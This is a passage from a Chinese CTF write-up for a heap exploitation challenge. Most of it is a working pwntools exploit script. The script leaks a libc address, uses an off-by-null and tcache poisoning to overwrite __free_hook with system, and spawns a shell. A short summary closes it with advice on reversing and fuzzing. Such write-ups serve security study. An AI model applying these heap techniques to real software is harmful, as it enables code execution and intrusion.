        while (iVar4 >> ')
        Num(n)
    def Add(size, cont):
        Cmd(1)
        sh.recvuntil('Input len:\n')
        Num(size)
        sh.recvuntil('Input content:\n')
        sh.send(cont)
    def Delete(idx):
        Cmd(2)
        sh.recvuntil('Input idx:\n')
        Num(idx)
    def Play(idx):
        Cmd(3)
        sh.recvuntil('Input idx:\n')
        Num(idx)
    #chunk arrange
    for i in range(9):
        Add(0xF0, str(i)*0xF0)
    Add(0x20, 'A'*0x20)
    Add(0x18, 'ABCCBA'*0x4)
    Add(0x18, 'C'*0x18)
    Add(0xF0, 'D'*0xF0)
    Add(0x20, 'gap')
    #leak libc addr
    for i in range(9):
        Delete(i)        #UB(C7, C8)
    for i in range(7):
        Add(0xF0, 'A'*0xF0)
    Add(0xF0, 'A'*8)    #get chunk C7
    Play(7)
    sh.recvuntil('Chal:\n')
    sh.recvuntil('A'*8)
    libc.address = u64(sh.recv(6).ljust(8, '\x00'))-0x3ebe90
    Log('libc.address')
    #offset by null
    for i in range(8):        #UB(C7, C8)
        Delete(i)
    Delete(11)
    Play(10)
    #forge fake size
    Delete(10)
    Add(0x18, flat(0, 0, 0x270))
    Delete(12)                #UB(C7, C8, ..., A, B, C, D)
    #tcache attack
    Delete(9)
    exp = '\x00'*0x1F0
    exp+= flat(0, 0x31)
    exp+= p64(libc.symbols['__free_hook']-0x8)    #ChunkA's fd
    Add(len(exp), exp)        #Tcache[0x30]->Chunk A->hook
    Add(0x20, '\x00'*0x20)
    exp = '/bin/sh\x00'
    exp+= p64(libc.symbols['system'])
    Add(0x20, exp)
    #getshell
    Delete(3)
    #gdb.attach(sh, '''
    #telescope (0x202100+0x0000555555554000) 16
    #heap bins
    #''')
    sh.interactive()
    '''
    ResArr:            telescope (0x202040+0x0000555555554000)
    PtrArr:            telescope (0x202100+0x0000555555554000)
    flag{w0rd_Pl4y_13_vu1ner4bl3}
    '''
###  总结
  * 本题最核心的地方在与逆向的过程, 更偏向真实环境, 我们不可能也不需要弄明白每一条指令, 弄清楚什么操作会导致什么效果即可, 这个操作的粒度可以大一些
  * 在本题中PlayFunc()函数在找漏洞时,只需要关注与pwn相关的, 算法相关可以放一放 
    * 只用关注malloc后面的写入操作是如何定界的
    * 关注怎么循环才可以得到我想要的值
  * 最后就是凭感觉fuzz了, 构造特殊样例